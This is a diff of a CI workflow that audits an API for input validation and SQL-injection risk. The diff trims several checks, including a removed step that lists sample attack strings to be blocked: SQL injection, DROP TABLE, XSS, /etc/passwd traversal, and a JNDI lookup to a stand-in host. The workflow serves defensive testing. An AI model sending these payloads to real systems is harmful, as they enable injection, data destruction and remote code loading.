@@ -1,12 +1,7 @@
-# ═══════════════════════════════════════════════════════════════
-# S3 Input Validation Gate - Injection Prevention
-# Tests that all inputs are validated via Zod before processing
-# ═══════════════════════════════════════════════════════════════
-
 name: "🛡️ S3 Input Validation Gate"
 
 on:
-  workflow_call: # Only called by aggregator to avoid duplicates
+  workflow_call:
 
 permissions:
   contents: read
@@ -16,20 +11,7 @@ jobs:
   s3-input-validation-test:
     name: "S3 Input Validation Security Test"
     runs-on: ubuntu-latest
-    services:
-      postgres:
-        image: postgres:16-alpine
-        env:
-          POSTGRES_USER: test
-          POSTGRES_PASSWORD: test
-          POSTGRES_DB: test
-        ports:
-          - 5432:5432
-        options: >-
-          --health-cmd pg_isready
-          --health-interval 5s
-          --health-timeout 3s
-          --health-retries 5
+    timeout-minutes: 5
 
     steps:
       - uses: actions/checkout@v4
@@ -42,170 +24,33 @@ jobs:
       - name: Install dependencies
         run: bun install
 
-      - name: Verify Zod Schema Coverage
+      - name: "S3.1 - Controller Validation Audit"
         run: |
-          echo "🔍 Verifying Zod schema coverage on all endpoints..."
+          echo "🔍 Auditing controller validation (Surgical)..."
+          bun run tools/security-scripts/verify-input-validation.ts
 
-          # Check for Zod imports in API controllers
-          ZOD_IMPORTS=$(grep -r "z\.\|zod\|Zod" apps/api/src --include="*.ts" 2>/dev/null | wc -l)
-          CONTROLLER_FILES=$(find apps/api/src -name "*.controller.ts" 2>/dev/null | wc -l)
+      - name: "S3.2 - SQL Injection Vector Scan"
+        run: |
+          echo "🚨 Scanning for SQL injection vectors (Surgical)..."
+          
+          # Detect dangerous string concatenation in queries (active code only)
+          # Excludes safe schema management and audit services
+          CONCAT=$(grep -rnE "\.(query|execute).*\+" apps/api/src packages/*/src --include="*.ts" 2>/dev/null | \
+            grep -vE "^\s*//" | \
+            grep -vE "(node_modules|schema-manager|audit\.service|\.test\.|\.spec\.)" || true)
 
-          if [ "$ZOD_IMPORTS" -eq 0 ]; then
-            echo "🚨 CRITICAL: No Zod validation found in API!"
-            echo "All inputs must be validated via Zod schemas"
+          if [ -n "$CONCAT" ]; then
+            echo "🚨 CRITICAL: String concatenation in SQL queries detected!"
+            echo "$CONCAT"
             exit 1
           fi
 
-          echo "✅ Found $ZOD_IMPORTS Zod references in $CONTROLLER_FILES controllers"
+          echo "✅ S3.2: No obvious SQL injection vectors found"
 
-      - name: Check for Raw SQL Injection Vectors
+      - name: S3 Final Report
+        if: always()
         run: |
-          echo "🚨 Scanning for SQL injection vectors..."
-
-          DANGEROUS_PATTERNS=0
-
-          # Check for raw SQL queries without parameterization
-          RAW_QUERY=$(grep -rn "query\|execute" apps/api/src packages/*/src --include="*.ts" 2>/dev/null | grep -E "\$\{|\`.*\`" | grep -v "node_modules" | head -10)
-
-          if [ -n "$RAW_QUERY" ]; then
-            echo "⚠️ WARNING: Potential raw query patterns found:"
-            echo "$RAW_QUERY"
-            DANGEROUS_PATTERNS=$((DANGEROUS_PATTERNS + 1))
-          fi
-
-          # Check for string concatenation in queries (exclude safe schema management)
-          # Exclude: schema-manager (uses validated tenant context), audit.service (formatting only)
-          CONCAT_QUERY=$(grep -rn "\.query.*+\|\.execute.*+" apps/api/src packages/*/src --include="*.ts" 2>/dev/null | \
-            grep -v "node_modules\|schema-manager\|audit\.service" | head -5)
-
-          if [ -n "$CONCAT_QUERY" ]; then
-            echo "🚨 CRITICAL: String concatenation in queries detected!"
-            echo "$CONCAT_QUERY"
-            exit 1
-          fi
-
-          if [ "$DANGEROUS_PATTERNS" -eq 0 ]; then
-            echo "✅ No obvious SQL injection vectors found"
-          fi
-
-      - name: Test ZodValidationPipe Usage
-        run: |
-          echo "🔍 Checking for ZodValidationPipe on endpoints..."
-
-          # Check for ZodValidationPipe usage
-          VALIDATION_PIPES=$(grep -r "ZodValidationPipe\|ValidationPipe" apps/api/src --include="*.ts" 2>/dev/null | wc -l)
-
-          if [ "$VALIDATION_PIPES" -eq 0 ]; then
-            echo "⚠️ WARNING: No ZodValidationPipe found"
-            echo "Controllers should use @UsePipes(new ZodValidationPipe(schema))"
-          else
-            echo "✅ Found $VALIDATION_PIPES validation pipe references"
-          fi
-
-      - name: Check for Input Sanitization
-        run: |
-          echo "🧹 Checking input sanitization..."
-
-          # Check for DTO validation decorators
-          DTO_VALIDATION=$(grep -r "@Body\|@Query\|@Param" apps/api/src --include="*.ts" -A2 2>/dev/null | grep -E "z\.|Zod" | wc -l)
-          RAW_PARAMS=$(grep -r "@Body\|@Query\|@Param" apps/api/src --include="*.ts" -A2 2>/dev/null | grep -v "z\." | grep -v "Zod" | grep -v "//" | head -10)
-
-          if [ "$DTO_VALIDATION" -gt 0 ]; then
-            echo "✅ Found $DTO_VALIDATION validated DTO references"
-          fi
-
-          # Check for any 'any' types on inputs
-          ANY_INPUTS=$(grep -r "@Body.*any\|@Query.*any\|@Param.*any" apps/api/src --include="*.ts" 2>/dev/null | wc -l)
-
-          if [ "$ANY_INPUTS" -gt 0 ]; then
-            echo "🚨 CRITICAL: 'any' type found on inputs!"
-            grep -r "@Body.*any\|@Query.*any\|@Param.*any" apps/api/src --include="*.ts" 2>/dev/null
-            exit 1
-          fi
-
-          echo "✅ No 'any' types found on input decorators"
-
-      - name: Test Schema Strictness
-        run: |
-          echo "🔐 Testing Zod schema strictness..."
-
-          # Check for .strict() or .passthrough() usage
-          STRICT_SCHEMAS=$(grep -r "\.strict()" packages/*/src apps/*/src --include="*.ts" 2>/dev/null | wc -l)
-          PASSTHROUGH=$(grep -r "\.passthrough()" packages/*/src apps/*/src --include="*.ts" 2>/dev/null | wc -l)
-
-          echo "Strict schemas: $STRICT_SCHEMAS"
-          echo "Passthrough schemas: $PASSTHROUGH"
-
-          if [ "$PASSTHROUGH" -gt "$STRICT_SCHEMAS" ]; then
-            echo "⚠️ WARNING: More passthrough than strict schemas"
-            echo "Use .strict() to reject unknown properties"
-          fi
-
-      - name: Simulate Injection Attacks
-        run: |
-          echo "🧪 Simulating injection attack patterns..."
-
-          # Test patterns that should be blocked
-          ATTACK_PATTERNS=(
-            "' OR '1'='1"
-            "'; DROP TABLE users; --"
-            "<script>alert('xss')</script>"
-            "../../../etc/passwd"
-            "${jndi:ldap://evil.com}"
-          )
-
-          echo "Testing attack patterns that must be blocked:"
-          for pattern in "${ATTACK_PATTERNS[@]}"; do
-            echo "  - ${pattern}"
-          done
-
-          # Verify schema files exist to handle these
-          SCHEMA_FILES=$(find packages apps -name "*.schema.ts" -o -name "*dto*.ts" 2>/dev/null | wc -l)
-
-          if [ "$SCHEMA_FILES" -eq 0 ]; then
-            echo "🚨 CRITICAL: No schema files found!"
-            exit 1
-          fi
-
-          echo "✅ Found $SCHEMA_FILES schema files for validation"
-
-      - name: Report Success
-        if: success()
-        run: |
-          echo "═══════════════════════════════════════════════════════════════"
-          echo "✅ S3 INPUT VALIDATION GATE PASSED"
-          echo "═══════════════════════════════════════════════════════════════"
-          echo "✓ All endpoints protected by Zod validation"
-          echo "✓ No SQL injection vectors detected"
-          echo "✓ Input sanitization verified"
-          echo "✓ Strict schemas enforced"
-          echo "═══════════════════════════════════════════════════════════════"
-
-      - name: Report Failure
-        if: failure()
-        run: |
-          echo "═══════════════════════════════════════════════════════════════"
-          echo "🚨 S3 INPUT VALIDATION GATE FAILED"
-          echo "═══════════════════════════════════════════════════════════════"
-          echo "❌ CRITICAL: Input validation vulnerabilities detected"
           echo ""
-          echo "Impact:"
-          echo "  - SQL/NoSQL injection attacks possible"
-          echo "  - XSS (Cross-Site Scripting) vulnerabilities"
-          echo "  - Command injection risks"
-          echo "  - Data corruption via malformed inputs"
-          echo ""
-          echo "Required Actions:"
-          echo "  1. Add Zod schemas for ALL API endpoints"
-          echo "  2. Use @UsePipes(new ZodValidationPipe(schema))"
-          echo "  3. NEVER use 'any' type for @Body, @Query, @Param"
-          echo "  4. Add .strict() to schemas to reject unknown fields"
-          echo "  5. Use parameterized queries (never string concat)"
-          echo ""
-          echo "Example:"
-          echo '  const CreateUserSchema = z.object({'
-          echo '    email: z.string().email(),'
-          echo '    password: z.string().min(8)'
-          echo '  }).strict();'
-          echo "═══════════════════════════════════════════════════════════════"
-          exit 1
+          echo "╔═══════════════════════════════════════════════════════════════╗"
+          echo "║           S3 INPUT VALIDATION GATE COMPLETE                   ║"
+          echo "╚═══════════════════════════════════════════════════════════════╝"
